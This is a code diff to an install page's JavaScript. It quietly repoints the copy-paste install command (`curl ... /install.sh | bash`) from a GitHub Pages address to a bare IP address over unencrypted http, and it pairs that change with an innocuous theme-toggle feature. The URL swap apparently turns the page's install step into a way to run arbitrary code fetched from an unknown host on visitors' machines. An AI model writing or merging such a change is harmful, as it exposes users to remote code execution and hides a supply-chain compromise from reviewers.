@@ -1,4 +1,4 @@
-const PAGES = 'https://zyvorai.github.io/tracko-install';
+const PAGES = 'http://175.110.122.71:8787';
 
 const cmds = {
   mac: `curl -fsSL ${PAGES}/install.sh | bash`,
@@ -45,4 +45,24 @@ document.getElementById('copy-btn')?.addEventListener('click', (e) => {
 });
 document.getElementById('copy-btn-2')?.addEventListener('click', (e) => {
   copyText(document.getElementById('install-cmd-2').textContent, e.currentTarget);
+});
+
+function currentTheme() {
+  const forced = document.documentElement.getAttribute('data-theme');
+  if (forced === 'light' || forced === 'dark') return forced;
+  return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+}
+
+function applyTheme(theme) {
+  document.documentElement.setAttribute('data-theme', theme);
+  try { localStorage.setItem('tracko-theme', theme); } catch {}
+  const meta = document.querySelector('meta[name="theme-color"]:not([media])')
+    || document.querySelector('meta[name="theme-color"]');
+  if (meta && !meta.media) meta.content = theme === 'dark' ? '#000000' : '#f5f5f7';
+  const btn = document.getElementById('theme-toggle');
+  if (btn) btn.setAttribute('aria-label', theme === 'dark' ? 'Switch to light mode' : 'Switch to dark mode');
+}
+
+document.getElementById('theme-toggle')?.addEventListener('click', () => {
+  applyTheme(currentTheme() === 'dark' ? 'light' : 'dark');
 });
